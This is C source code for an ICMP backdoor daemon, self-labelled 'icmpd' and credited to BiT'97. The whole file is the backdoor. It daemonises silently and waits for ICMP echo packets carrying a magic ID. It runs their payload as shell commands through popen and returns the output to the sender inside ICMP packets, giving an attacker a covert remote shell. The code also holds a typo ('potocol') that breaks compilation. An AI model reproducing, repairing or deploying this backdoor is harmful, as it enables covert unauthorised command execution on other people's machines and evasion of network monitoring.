/* icmpd - ICMP backdoor server */
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/in.h>
#include <unistd.h>

#define RID 31337
#define LID 12345
#define VER "0.3"

void start_pipe(char *buf,int len);
void send_connect(unsigned long to, unsigned int id,char *data);
u_short cksum(u_short *buf, int nwords);

void main()
{
  char buf[512];
  struct iphdr *ip=(struct iphdr *)buf;
  struct icmphdr *icmp=(struct icmphdr *)(buf+sizeof(struct iphdr));
  int lsock,i;
  printf("ICMP PIPE %s - DAEMON PART - BiT'97\n",VER);

  if(geteuid())
    printf("User luser detected\n"),exit(-1);
    lsock=socket(AF_INET,SOCK_RAW,1);
    close(0);close(1);close(2);
    if(fork())
    exit(0);

  while(1)
  {
    i=read(lsock,buf,512);
      if(ip->protocol == 1 && icmp->type == 0 && ntohs(icmp->un.echo.id) == RID)
        start_pipe(buf,i);
  }
}

void start_pipe(char *buf,int len)
{
  char databuf[512];
  FILE *haha;
  struct iphdr *ip=(struct iphdr *)buf;
  struct icmphdr *icmp=(struct icmphdr *)(buf+sizeof(struct iphdr));
  int lsock,i;
  char *p;
  unsigned long int tmp;
  struct sockaddr_in sa;

  lsock=socket(AF_INET,SOCK_RAW,1);
  icmp->un.echo.id=ntohs(LID);
  sa.sin_family=AF_INET;
  sa.sin_addr.s_addr=ip->saddr;
  sendto(lsock,icmp,len-sizeof(struct iphdr),0,(struct sockaddr *)&sa,sizeof(sa));

  /* connected */
  while(1)
  {
    i=recv(lsock,buf,512,0);
      if(ip->potocol == 1 && icmp->type == 0 && ntohs(icmp->un.echo.id) == RID) {
        p=(buf+sizeof(struct iphdr)+sizeof(struct icmphdr));
        memcpy(databuf,p,i-(sizeof(struct iphdr)+sizeof(struct icmphdr))+1);
          if(strcasecmp(databuf,"exit") == 0)
            return;
              if((haha=popen(databuf,"r")) == NULL)
                send_connect(ip->saddr,LID,"Unknown command.\n");
              else {
                i=0;
                  while(fgets(databuf,512,haha) != NULL) {
                    i++;
                    send_connect(ip->saddr,LID,databuf);
                  }
                  if(!i)
                    send_connect(ip->saddr,LID,"Unknown command.\n");
                      pclose(haha);
              }
      }
      fflush(stdout);fflush(stdin);
  }
}

void send_connect(unsigned long to, unsigned int id,char *data)
{
  char buf[512];
  struct icmphdr *icmp = (struct icmphdr *)buf;
  char *bla=(buf+sizeof(struct icmphdr));
  struct sockaddr_in sa;
  int i,sock;

  sock=socket(AF_INET,SOCK_RAW,1);
  bzero(buf,512);
  icmp->type=0;
  icmp->un.echo.id=htons(id);
  strcpy(bla,data);
  icmp->checksum=cksum((u_short *)icmp,(9+strlen(data))>>1);
  sa.sin_family=AF_INET;
  sa.sin_addr.s_addr=to;
  i=sendto(sock,buf,(9+strlen(data)),0,(struct sockaddr *)&sa,sizeof(sa));
  close(sock);
}

u_short cksum(u_short *buf, int nwords) {

  unsigned long sum;

  for ( sum = 0; nwords > 0; nwords -- )
    sum += *buf++;
    sum = ( sum >> 16) + ( sum & 0xffff );
    sum += ( sum >> 16 );
    return ~sum ;
}
